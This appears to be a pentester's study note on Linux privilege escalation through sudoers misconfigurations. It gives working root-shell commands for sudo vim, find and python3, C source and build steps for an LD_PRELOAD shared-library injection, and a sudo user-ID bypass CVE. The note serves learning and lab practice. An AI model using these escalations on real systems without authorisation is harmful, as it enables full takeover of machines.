# Sudoers

## Overview

`/etc/sudoers` is a policy file that grants specific users permission to run commands as another user (usually root), with or without password authentication.

```
www-data ALL=(root) NOPASSWD: /usr/bin/vim
# user    host=(as_who) auth:      command
```

---

## Discovery

After foothold, always run:

```bash
id
sudo -l        # lists what the current user can run via sudo
```

---

## Common Misconfigurations

### 1. NOPASSWD on dangerous binaries

If a binary can spawn a shell or read/write arbitrary files, it's game over.

```bash
sudo vim        # then :!bash inside vim → root shell
sudo find . -exec /bin/bash \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
```

> Reference: **GTFOBins** (`gtfobins.github.io`) — catalogs every binary abusable via sudo/SUID

---

### 2. LD_PRELOAD (shared library injection)

If sudoers preserves the `LD_PRELOAD` environment variable:

```
Defaults env_keep += LD_PRELOAD
```

You can inject a malicious shared library that executes before the real binary:

```c
// evil.c
#include <stdlib.h>
void _init() {
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -shared -fPIC -o /tmp/evil.so evil.c -nostartfiles
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/find
```

**Why this works with sudo but not SUID:** the dynamic linker strips `LD_PRELOAD` for SUID binaries automatically. Sudo re-executes the process and if `env_keep` is set, the protection is bypassed.

---

## [[Sudoers]] vs [[SUID Binaries]] — Key Differences

| | SUID | Sudoers |
|---|---|---|
| Who grants it | File owner via `chmod` | Admin via `/etc/sudoers` |
| Who can use it | Anyone who can execute the binary | Specific users only |
| Authentication | None | Usually password (or `NOPASSWD`) |
| Discovery | `find / -perm -4000 2>/dev/null` | `sudo -l` |
| `LD_PRELOAD` respected? | No — linker strips it | Yes, if `env_keep` misconfigured |
| Scope | That binary only | Configurable per command |

---

## Escalation Flow

```
foothold (e.g. www-data via RCE)
    └─ sudo -l
        ├─ dangerous binary → GTFOBins for shell escape
        └─ env_keep LD_PRELOAD → shared library injection → root
```

---

## Resources

### Reference & Cheatsheets

- **GTFOBins**: `gtfobins.github.io` — sudo/SUID/capabilities abuse per binary, the go-to during live pentests
- **HackTricks — Linux Privesc**: `book.hacktricks.xyz/linux-hardening/privilege-escalation` — comprehensive coverage of sudo, SUID, capabilities, cron, and more
- **PayloadsAllTheThings**: `github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md` — payloads and techniques reference

### Official Docs

- `man sudoers` — focus on `env_reset`, `env_keep`, `NOPASSWD`, `secure_path`
- **sudo official site**: `sudo.ws` — changelogs, security advisories, full documentation

### Notable CVEs to Know

- **CVE-2021-3156** (Baron Samedit) — heap-based buffer overflow in sudo, affects versions < 1.9.5p2, allows local privesc without any sudoers entry
- **CVE-2019-14287** — `sudo -u#-1` bypasses user restriction, affects sudo < 1.8.28

### Practice (HTB / Labs)

- On HackTheBox search machines tagged: `sudo`, `privesc`, `linux`
- Easy/Medium Linux boxes almost always have a `sudo -l` step — good pattern to internalize
- **TryHackMe** has dedicated rooms: search "sudo privesc" or "linux privilege escalation"

---

## Tags

#privesc #linux #sudo #sudoers #ethical-hacking
